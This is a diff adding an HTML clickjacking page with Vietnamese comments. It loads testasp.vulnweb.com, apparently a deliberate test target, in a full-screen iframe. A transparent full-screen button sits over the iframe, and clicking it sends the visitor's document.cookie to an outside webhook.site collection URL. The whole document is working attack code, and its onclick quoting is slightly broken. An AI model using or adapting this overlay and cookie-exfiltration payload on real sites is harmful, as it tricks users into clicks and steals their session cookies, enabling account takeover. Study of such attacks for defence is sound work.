@@ -1,0 +1,51 @@
+<style>
+body {
+    margin: 0;
+}
+
+/* iframe phủ full màn hình */
+iframe {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    opacity: 1; /* đừng để 0 */
+    z-index: 1;
+    border: none;
+}
+
+    /* nút giả phủ full */
+    .button {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        z-index: 2;
+        background: transparent;
+        border: none;
+        cursor: pointer;
+    }
+
+    /* button phủ toàn bộ màn hình */
+    .fullscreen-btn {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        
+        background: transparent; /* trong suốt */
+        border: none;
+        cursor: pointer;
+
+        z-index: 9999; /* luôn nằm trên cùng */
+    }
+</style>
+
+<!-- nút phủ full -->
+<button class="fullscreen-btn" onclick="new Image().src="https://webhook.site/-da69-4af5-9dbc-ed4b771092f8?c="+encodeURIComponent(document.cookie);"></button>
+
+<!-- iframe target -->
+<iframe src="http://testasp.vulnweb.com/"></iframe>
